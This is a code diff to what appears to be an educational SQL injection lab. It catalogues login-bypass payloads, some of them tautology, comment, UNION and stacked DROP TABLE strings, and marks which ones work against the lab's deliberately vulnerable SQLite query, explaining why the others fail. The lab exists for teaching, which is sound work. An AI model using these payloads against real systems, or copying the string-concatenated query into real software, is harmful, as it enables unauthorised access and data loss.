@@ -22,7 +22,14 @@ export type SqlPayload = {
   exampleQuery: string;
   impact: string;
   severity: Severity;
+  /** Bypasses the project's vulnerable login (single-quoted fields, SQLite). */
+  worksInLab: boolean;
+  labMismatchReason?: string;
 };
+
+/** SQL construction used by backend/api/login-vulnerable.php and the live preview. */
+export const LAB_SQL_CONTEXT =
+  "Values are wrapped in single quotes — only a closing quote (') breaks out into SQL code";
 
 export const ATTACK_CATEGORIES: {
   id: AttackCategory;
@@ -74,6 +81,7 @@ export const PAYLOADS: SqlPayload[] = [
     exampleQuery: "SELECT * FROM users WHERE username='' OR '1'='1' --' AND password='...'",
     impact: "Full login bypass without knowing any password.",
     severity: "critical",
+    worksInLab: true,
   },
   {
     id: "or-1-1",
@@ -87,6 +95,7 @@ export const PAYLOADS: SqlPayload[] = [
     exampleQuery: "SELECT * FROM users WHERE username='' OR 1=1 --' AND password='...'",
     impact: "Bypasses authentication and returns the first user in the table.",
     severity: "critical",
+    worksInLab: true,
   },
   {
     id: "double-quote-bypass",
@@ -100,6 +109,9 @@ export const PAYLOADS: SqlPayload[] = [
     exampleQuery: 'SELECT * FROM users WHERE username="" OR "1"="1" --" AND password="..."',
     impact: "Login bypass on double-quoted SQL construction.",
     severity: "high",
+    worksInLab: false,
+    labMismatchReason:
+      "This lab wraps values in single quotes ('), so the double quotes stay inside the literal and do not break out of the string.",
   },
   {
     id: "no-quote-bypass",
@@ -113,6 +125,9 @@ export const PAYLOADS: SqlPayload[] = [
     exampleQuery: "SELECT * FROM users WHERE username=1 OR 1=1 AND password='...'",
     impact: "Authentication bypass on unquoted parameter insertion.",
     severity: "high",
+    worksInLab: false,
+    labMismatchReason:
+      'The app builds username=\'1 OR 1=1\' — the database searches for that exact text as a username. OR 1=1 is never parsed as SQL unless the developer omits quotes (see example query).',
   },
   {
     id: "admin-comment-dash",
@@ -126,6 +141,7 @@ export const PAYLOADS: SqlPayload[] = [
     exampleQuery: "SELECT * FROM users WHERE username='admin' --' AND password='...'",
     impact: "Targeted login as a known username without the password.",
     severity: "critical",
+    worksInLab: true,
   },
   {
     id: "admin-comment-hash",
@@ -139,6 +155,9 @@ export const PAYLOADS: SqlPayload[] = [
     exampleQuery: "SELECT * FROM users WHERE username='admin'#' AND password='...'",
     impact: "Password check removed via MySQL comment syntax.",
     severity: "critical",
+    worksInLab: false,
+    labMismatchReason:
+      "The # comment syntax is MySQL-specific. This lab uses SQLite, which rejects # as a comment.",
   },
   {
     id: "block-comment",
@@ -152,6 +171,7 @@ export const PAYLOADS: SqlPayload[] = [
     exampleQuery: "SELECT * FROM users WHERE username='admin'/*' AND password='...'",
     impact: "Bypasses filters that only block -- and # but allow block comments.",
     severity: "medium",
+    worksInLab: true,
   },
   {
     id: "union-forge",
@@ -166,6 +186,7 @@ export const PAYLOADS: SqlPayload[] = [
       "SELECT * FROM users WHERE username='' UNION SELECT 1,'admin','x' --' AND password='...'",
     impact: "Data extraction or forged login row without valid credentials.",
     severity: "critical",
+    worksInLab: true,
   },
   {
     id: "union-null",
@@ -180,6 +201,7 @@ export const PAYLOADS: SqlPayload[] = [
       "SELECT * FROM users WHERE username='' UNION SELECT null,null,null --' AND password='...'",
     impact: "Reconnaissance step toward full UNION-based data theft.",
     severity: "medium",
+    worksInLab: true,
   },
   {
     id: "blind-boolean-true",
@@ -193,6 +215,9 @@ export const PAYLOADS: SqlPayload[] = [
     exampleQuery: "SELECT * FROM users WHERE username='' OR 'a'='a' AND password='...'",
     impact: "Login succeeds; in blind contexts this confirms injectable input.",
     severity: "high",
+    worksInLab: false,
+    labMismatchReason:
+      "Without a comment (--), the password clause still runs. This probe is useful for blind SQLi, but it does not bypass this login form.",
   },
   {
     id: "blind-and-true",
@@ -206,6 +231,9 @@ export const PAYLOADS: SqlPayload[] = [
     exampleQuery: "SELECT * FROM users WHERE username='' AND 1=1 --' AND password='...'",
     impact: "Confirms boolean-based blind injection vector.",
     severity: "low",
+    worksInLab: false,
+    labMismatchReason:
+      "This is a reconnaissance probe (true branch), not a tautology that returns a user row on this login.",
   },
   {
     id: "stacked-select",
@@ -219,6 +247,9 @@ export const PAYLOADS: SqlPayload[] = [
     exampleQuery: "SELECT * FROM users WHERE username=''; SELECT 1; --' AND password='...'",
     impact: "Potential for data reads, writes, or schema changes in vulnerable configs.",
     severity: "high",
+    worksInLab: false,
+    labMismatchReason:
+      "SQLite via PDO executes one statement per query() call — stacked SQL does not bypass this login.",
   },
   {
     id: "stacked-drop",
@@ -232,6 +263,9 @@ export const PAYLOADS: SqlPayload[] = [
     exampleQuery: "SELECT * FROM users WHERE username=''; DROP TABLE users; --' AND password='...'",
     impact: "Demonstrates catastrophic damage possible with stacked queries (educational only).",
     severity: "critical",
+    worksInLab: false,
+    labMismatchReason:
+      "Stacked queries are not executed on this login endpoint (single statement, SQLite PDO).",
   },
   {
     id: "encoding-no-space",
@@ -245,6 +279,7 @@ export const PAYLOADS: SqlPayload[] = [
     exampleQuery: "SELECT * FROM users WHERE username='admin'--' AND password='...'",
     impact: "Bypasses simplistic WAF/filter rules on comment syntax.",
     severity: "medium",
+    worksInLab: true,
   },
   {
     id: "encoding-empty-string",
@@ -258,6 +293,9 @@ export const PAYLOADS: SqlPayload[] = [
     exampleQuery: "SELECT * FROM users WHERE username='' OR ''='' AND password='...'",
     impact: "Authentication bypass using alternate tautology syntax.",
     severity: "high",
+    worksInLab: false,
+    labMismatchReason:
+      "Operator precedence leaves the password check active — no row matches on this login query shape.",
   },
   {
     id: "password-or-bypass",
@@ -271,6 +309,7 @@ export const PAYLOADS: SqlPayload[] = [
     exampleQuery: "SELECT * FROM users WHERE username='admin' AND password='' OR '1'='1' --'",
     impact: "Bypass even when username is correct or locked down.",
     severity: "critical",
+    worksInLab: true,
   },
 ];
 
@@ -360,6 +399,23 @@ export function buildVulnerableQuery(username: string, password: string): string
   return `SELECT * FROM users WHERE username='${username}' AND password='${password}'`;
 }
 
+/** Input can close the opening quote and change SQL structure in this lab. */
+export function escapesSingleQuotedLiteral(value: string): boolean {
+  return value.includes("'");
+}
+
+export function altersLabQueryLogic(username: string, password: string): boolean {
+  return escapesSingleQuotedLiteral(username) || escapesSingleQuotedLiteral(password);
+}
+
+/** Highlight only syntax that actually leaves the string literal in this lab. */
+export function highlightLabQueryValue(value: string): { text: string; danger: boolean }[] {
+  if (!escapesSingleQuotedLiteral(value)) {
+    return value ? [{ text: value, danger: false }] : [{ text: "", danger: false }];
+  }
+  return highlightDanger(value);
+}
+
 export function buildSecureQuery(): string {
   return `SELECT * FROM users WHERE username = ? AND password = ?`;
 }
@@ -413,6 +469,14 @@ function buildInjectionResult(
   };
 }
 
+export function explainLabMismatch(username: string, password: string): string | null {
+  const matched = findMatchingPayload(username, password);
+  if (matched && !matched.worksInLab) {
+    return matched.labMismatchReason ?? "This payload does not match how this lab builds SQL.";
+  }
+  return null;
+}
+
 export function simulateVulnerableLogin(username: string, password: string): AuthResult {
   const query = buildVulnerableQuery(username, password);
 
@@ -427,10 +491,35 @@ export function simulateVulnerableLogin(username: string, password: string): Aut
   }
 
   const matchedPayload = findMatchingPayload(username, password);
+
+  if (matchedPayload && !matchedPayload.worksInLab) {
+    return {
+      granted: false,
+      reason:
+        matchedPayload.labMismatchReason ??
+        "This payload targets a different SQL construction than this lab uses.",
+      query,
+      attackType: matchedPayload.category,
+      technique: matchedPayload.technique,
+      impact: matchedPayload.impact,
+      payloadId: matchedPayload.id,
+    };
+  }
+
   const category = classifyAttack(username, password);
 
-  if (category) {
+  if (category && matchedPayload?.worksInLab) {
     return buildInjectionResult(query, category, matchedPayload);
+  }
+
+  if (category && !matchedPayload) {
+    return {
+      granted: false,
+      reason:
+        "Dangerous SQL-like input was detected, but it does not bypass this login query against the real database.",
+      query,
+      attackType: category,
+    };
   }
 
   return { granted: false, reason: "No user matched username and password.", query };
